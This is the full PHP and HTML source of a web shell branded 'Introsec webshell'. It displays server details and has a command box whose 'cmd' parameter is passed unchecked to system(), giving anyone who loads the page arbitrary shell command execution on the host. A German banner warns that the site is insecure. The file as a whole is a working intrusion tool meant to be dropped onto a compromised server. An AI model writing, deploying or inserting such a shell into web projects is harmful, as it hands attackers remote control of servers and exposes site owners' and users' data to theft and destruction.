<html>
    <head>
        <link rel="icon" type="image/x-icon" href="isec-hacker-team-img.png">
        <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
        <title>INTROSEC WEBSHELL</title>
    </head>
    <body>
        <style>
            *{font-family: "Poppins";}
            body{
                padding 0 20px 20px 20px;
                background: black;
                background-repeat: no-repeat;
                background-size: cover;
                background-position: 100%;
                background-attachment: fixed;
                color: white;
            }
            h1{
                margin: 0;
                padding: 0 20px;
                font-size: 80px;
                font-weight: bold;
                text-align: center;
                text-transform: uppercase;
            }
            p{
                font-size: 18px;
            }
            div{
                font-size: 1.5rem;
            }
            marquee{
                font-size: 1.5rem;
                font-weight: bold;
            }
            img{
                display: block;
                margin: 0 auto;
            }
            input[type="submit"] {
                display: none;
            }
            input[type="TEXT"] {
                border: none;
                outline: 0;
                background: none;
                color: white;
                font-size: 16px;
            }
            pre{
                text-align:center;
                font-size: 18px;
            }
            p.file-temp{
                font-size: 16px;
            }
            #system-info{
                width: 60rem;
                margin: 0 auto;
                display: block;
                overflow: auto;
            }
            .link-system{
                color: lightgreen;
                font-weight: bold;
            }
            .btn {
                text-decoration: none;
                color: lightgreen;
                font-weight: bold;
            }
            .btn:hover{
                color: lightseagreen;
            }
            button{
                background-color: black;
                border: none;
                font-size: 16px;
            }
            table.file-manager-data thead th{
                font-weight: bold;
            }
            table.file-manager-data thead th:last-child{
                border-right: none;
            }
            span.alert{
                color: red;
                font-weight: bold;
                text-shadow: 2px 1px purple;
                animation: textAnimate 1.0s infinite alternate;
            }
            p.warning{
                text-align: center;
            }
            @keyframes textAnimate{
                0% {
                    opacity: 0;
                }
                100% {
                    opacity: 1;
                }
            }
        </style>
        <div style="text-align: left; padding: 15px;">
            <h1>Introsec<span style="color: red;"> <i>webshell</i></span></h1>
            <img src="isec-hacker-team-img.png" height="300"/>  
            <p class="warning">Alert warning: <span class="alert">Das System ist nicht sicher. Der Entwickler muss die Website reparieren, bevor Black-Hat-Hacker Ihre sensiblen Daten stehlen </span></p>     
            <br>          
            <p>Web server software:  <a class="link-system"><?php echo $_SERVER['SERVER_SOFTWARE']?></a></p>
            <p>
                Kernel: 
                <a class="link-system"> <?=shell_exec('ver');?> 
                <?php echo gethostname();?> 
                <?php
                    if (PHP_INT_SIZE === 8) {
                        $architecture = '64-bit';
                    } else {
                        $architecture = '32-bit';
                    }
                    
                    echo "PHP Architecture: " . $architecture;
                ?>
                </a>
            </p>
            <p>Safe mode: <a class="link-system">OFF</a></p>
            <p>Server information: [ Your IP Address: <?=gethostbyname(gethostbyaddr($_SERVER["REMOTE_ADDR"]));?>, Timezone: <?php echo date_default_timezone_get();?> ]</p>
            <p>Current directory: <a class="link-system"><?=getcwd();?></a></p>
            <!-- <p>File upload: <input type="file"></p>   -->
            <br>
            <!-- <table class="file-manager-data"style="width: 100%">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Last Modified</th>
                        <th>Permissions</th>
                        <th>Action</th>
                    </tr>
                </thead>
            </table> -->
            <div id="system-info">
                <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
                    <p class="file-temp">C99/WEBSHELL/SYSTEM/FILE_MANAGER > <input type="TEXT" name="cmd" autofocus id="cmd" size="22"></p>
                    <input type="SUBMIT" value="Execute">
                </form>
                <pre>
                    <?php
                        if(isset($_GET['cmd']))
                        {
                            system($_GET['cmd'] . ' 2>&1');
                        }
                    ?>
                </pre>
            </div>
        </div>
    </body>
</html>